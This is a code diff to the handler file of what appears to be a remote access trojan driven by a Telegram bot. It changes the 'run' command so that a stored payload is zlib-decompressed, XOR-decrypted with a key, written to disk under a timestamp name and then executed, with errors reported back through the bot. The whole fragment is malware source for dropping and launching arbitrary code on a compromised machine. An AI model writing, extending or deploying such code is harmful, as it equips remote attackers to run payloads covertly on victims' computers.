@@ -1,5 +1,6 @@
 /*rat_handler/src/handlers.cpp*/
 #include "rat/Handler.hpp"
+#include "rat/compression.hpp"
 #include "rat/encryption/encryption.hpp"
 #include "rat/handler/debug.hpp"
 #include "rat/system.hpp"
@@ -92,10 +93,16 @@ void Handler::handleFetchCommand() {
 void Handler::handleRunCommand() {
 	const std::string time_stamp =
 	    ::rat::system::getCurrentDateTime_Underscored();
-	std::vector<uint8_t> payload = this->state.payload;
+
+	std::vector<uint8_t> copied_payload(this->state.payload);
+
 	const std::string &key = this->state.payload_key;
 
-	::rat::encryption::xorData(payload.data(), payload.size(), key.c_str());
+	::rat::compression::zlibDecompressVector(
+	    this->state.payload, this->state.payload_uncompressed_size);
+
+	::rat::encryption::xorData(this->state.payload.data(),
+	                           this->state.payload.size(), key.c_str());
 
 	std::string payload_path = time_stamp;
 #ifdef _WIN32
@@ -105,14 +112,16 @@ void Handler::handleRunCommand() {
 	    fmt::format("/lprocess {}", payload_path);
 	this->parseTelegramMessageToCommand();
 
-		if(!::rat::system::writeBytesIntoFile(time_stamp, payload)) {
+		if(!::rat::system::writeBytesIntoFile(time_stamp,
+		                                      this->state.payload)) {
 			HANDLER_ERROR_LOG("Failed to write to file system");
 			this->bot->sendMessage(
 			    "Failed to write the payload to the file system");
+			this->state.payload = std::move(copied_payload);
 			return;
 		}
 
-	payload.clear();
+	copied_payload.clear();
 
 	this->handleProcessCommand();
 }
